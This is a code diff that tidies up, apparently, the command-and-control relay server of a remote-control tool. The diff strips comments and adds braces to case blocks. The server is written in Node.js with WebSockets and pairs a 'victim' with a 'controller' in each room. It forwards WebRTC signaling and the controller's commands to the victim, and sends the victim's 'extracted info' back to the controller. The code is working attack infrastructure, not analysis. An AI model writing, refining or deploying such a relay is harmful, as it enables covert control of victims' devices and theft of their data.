@@ -7,21 +7,20 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
 
-// In-memory room storage
-const rooms = new Map(); // roomId -> { victimWs, controllerWs, victimOffer, controllerAnswer }
+const rooms = new Map();
 
 wss.on('connection', (ws) => {
     let roomId = null;
-    let role = null; // 'victim' or 'controller'
+    let role = null;
 
     ws.on('message', (message) => {
         try {
             const data = JSON.parse(message);
+
             switch (data.type) {
-                case 'join':
+                case 'join': {
                     roomId = data.room;
                     role = data.role;
                     if (!rooms.has(roomId)) {
@@ -37,14 +36,13 @@ wss.on('connection', (ws) => {
                     ws.role = role;
                     ws.send(JSON.stringify({ type: 'joined', role }));
                     break;
+                }
 
-                case 'webrtc_offer':
-                    // Victim sends SDP offer
+                case 'webrtc_offer': {
                     if (role === 'victim') {
                         const room = rooms.get(roomId);
                         if (room) {
                             room.victimOffer = data.offer;
-                            // Forward to controller if connected
                             if (room.controllerWs && room.controllerWs.readyState === WebSocket.OPEN) {
                                 room.controllerWs.send(JSON.stringify({
                                     type: 'webrtc_offer',
@@ -54,9 +52,9 @@ wss.on('connection', (ws) => {
                         }
                     }
                     break;
+                }
 
-                case 'webrtc_answer':
-                    // Controller sends SDP answer
+                case 'webrtc_answer': {
                     if (role === 'controller') {
                         const room = rooms.get(roomId);
                         if (room) {
@@ -70,9 +68,9 @@ wss.on('connection', (ws) => {
                         }
                     }
                     break;
+                }
 
-                case 'webrtc_ice':
-                    // Forward ICE candidates
+                case 'webrtc_ice': {
                     const room = rooms.get(roomId);
                     if (room) {
                         const target = (role === 'victim') ? room.controllerWs : room.victimWs;
@@ -84,9 +82,9 @@ wss.on('connection', (ws) => {
                         }
                     }
                     break;
+                }
 
-                case 'command':
-                    // Controller sends a command to victim
+                case 'command': {
                     if (role === 'controller') {
                         const room = rooms.get(roomId);
                         if (room && room.victimWs && room.victimWs.readyState === WebSocket.OPEN) {
@@ -97,9 +95,9 @@ wss.on('connection', (ws) => {
                         }
                     }
                     break;
+                }
 
-                case 'info':
-                    // Victim sends extracted info to controller
+                case 'info': {
                     if (role === 'victim') {
                         const room = rooms.get(roomId);
                         if (room && room.controllerWs && room.controllerWs.readyState === WebSocket.OPEN) {
@@ -110,6 +108,7 @@ wss.on('connection', (ws) => {
                         }
                     }
                     break;
+                }
 
                 default:
                     break;
@@ -124,7 +123,6 @@ wss.on('connection', (ws) => {
             const room = rooms.get(roomId);
             if (room.victimWs === ws) room.victimWs = null;
             if (room.controllerWs === ws) room.controllerWs = null;
-            // Clean up if both are gone
             if (!room.victimWs && !room.controllerWs) {
                 rooms.delete(roomId);
             }
